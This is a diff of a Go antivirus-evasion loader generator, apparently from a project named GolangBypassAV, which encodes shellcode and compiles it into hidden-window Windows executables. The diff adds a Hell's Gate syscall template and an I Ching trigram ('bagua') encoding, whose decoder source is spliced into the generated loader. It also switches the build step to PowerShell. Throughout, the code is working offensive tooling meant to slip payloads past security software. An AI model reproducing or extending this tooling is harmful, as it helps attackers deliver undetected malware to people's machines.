@@ -1,6 +1,8 @@
 package main
 
 import (
+	"GolangBypassAV/bagua"
+	"bytes"
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
@@ -43,15 +45,19 @@ var encodeVal = "hex"
 const tmplHelp = `
 1. syscall
 2. createThread
+3. Hgate
 `
 
 const encodeHelp = `
 1. hex
 2. base64
+3. bagua
 `
 
 var decodeMethod = `
+import "encoding/base64"
 func $getDeCode(string2 string) []byte {
+	var $keyName []byte
 	ss, _ := $encode$.DecodeString(string2)
 	string2 = string(ss)
 	var code []byte
@@ -68,6 +74,73 @@ var decodeMethod1 = `
 func $getDeCode(code string) []byte {
 	ssb, _ := $encode$.DecodeString(string(code))
 	return ssb
+}
+`
+
+var decodeMethod2 = `
+import(
+	"os"
+	"strconv"
+    "errors"
+)
+
+const (
+	qian = "☰" 
+	dui  = "☱" 
+	li   = "☲"
+	zhen = "☳"
+	xun  = "☴"
+	kan  = "☵"
+	gen  = "☶"
+	kun  = "☷"
+)
+
+var m2 = map[string][3]int{
+	qian: {0, 0, 0},
+	dui:  {0, 0, 1},
+	li:   {0, 1, 0},
+	zhen: {0, 1, 1},
+	xun:  {1, 0, 0},
+	kan:  {1, 0, 1},
+	gen:  {1, 1, 0},
+	kun:  {1, 1, 1},
+}
+
+func b8ToByte(b []int) byte {
+	return byte(b[0]<<7 + b[1]<<6 + b[2]<<5 + b[3]<<4 + b[4]<<3 + b[5]<<2 + b[6]<<1 + b[7])
+}
+
+func decode(s string) ([]byte, error) {
+	if s == "" {
+		return nil, nil
+	}
+
+	sl := len(s)
+
+	is := make([]int, sl)
+	for i := 0; i < sl/3; i++ {
+		b, ok := m2[s[i*3:i*3+3]]
+		if !ok {
+			return nil, errors.New("invalid string, cur: " + strconv.Itoa(i))
+		}
+		copy(is[i*3:i*3+3], b[:])
+	}
+
+	buf := make([]byte, sl/8)
+	for i := 0; i < sl/8; i++ {
+		buf[i] = b8ToByte(is[i*8 : i*8+8])
+	}
+
+	return buf, nil
+}
+
+func $getDeCode(s string) []byte {
+	result, err := decode(s)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err.Error())
+		os.Exit(1)
+	}
+	return result
 }
 `
 
@@ -91,9 +164,11 @@ func init() {
 
 	tmplMap["1"] = "syscall"
 	tmplMap["2"] = "createThread"
+	tmplMap["3"] = "Hgate"
 
 	encodeMap["1"] = "hex"
 	encodeMap["2"] = "base64"
+	encodeMap["3"] = "bagua"
 }
 
 func getKey() []byte {
@@ -137,13 +212,18 @@ func getHexEnCode(data []byte) string {
 	return hex.EncodeToString(data)
 }
 
+func getBaguaEncode(data []byte) string {
+	return bagua.Bagua_en(data)
+}
+
 func gen(code *string) {
 
 	*code = strings.ReplaceAll(*code, "$method$", decodeMethod)
 
 	if encodeVal == "hex" {
 		*code = strings.ReplaceAll(*code, "\"encoding/base64\"", "")
-	} else {
+	}
+	if encodeVal == "base64" && tmplVal != "Hgate" {
 		*code = strings.ReplaceAll(*code, "\"encoding/hex\"", "")
 	}
 	//payload
@@ -226,9 +306,15 @@ func main() {
 		shellcodeStr = getHexEnCode(sc)
 		decodeMethod = decodeMethod1
 		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "hex")
-	} else {
+	}
+	if encodeVal == "base64" {
 		shellcodeStr = getBase64EnCode(sc)
 		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "base64.StdEncoding")
+	}
+	if encodeVal == "bagua" {
+		shellcodeStr = getBaguaEncode(sc)
+		decodeMethod = decodeMethod2
+
 	}
 
 	fmt.Println("[+]获取payload", "---->", path)
@@ -256,18 +342,21 @@ func main() {
 	//隐藏窗口，如有需要自行替换
 	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
 	//CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go
-	outFile := "patch" + string(time.Now().Format("200612150405")) + ".exe"
+	outFile := string(time.Now().Format("150405")) + ".exe"
 	//outFile := "patch.exe"
 	var cmd exec.Cmd
 	if hide {
 		//cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+outFile)
-		cmd = *exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o "+outFile+" ./shellcode.go")
+		cmd = *exec.Command("powershell.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o "+outFile+" ./shellcode.go")
 	} else {
-		cmd = *exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o "+outFile+" ./shellcode.go")
+		cmd = *exec.Command("powershell.exe", "/c", "go build -ldflags=-s -o "+outFile+" ./shellcode.go")
 	}
 	//阻塞至等待命令执行完成
+	var out bytes.Buffer
+	cmd.Stderr = &out
 	err1 := cmd.Run()
 	if err1 != nil {
+		fmt.Println("error: ", out.String()) // 增加模板报错信息详情显示
 		panic(err1)
 	}
 	fmt.Println("[+]生成文件" + outFile)
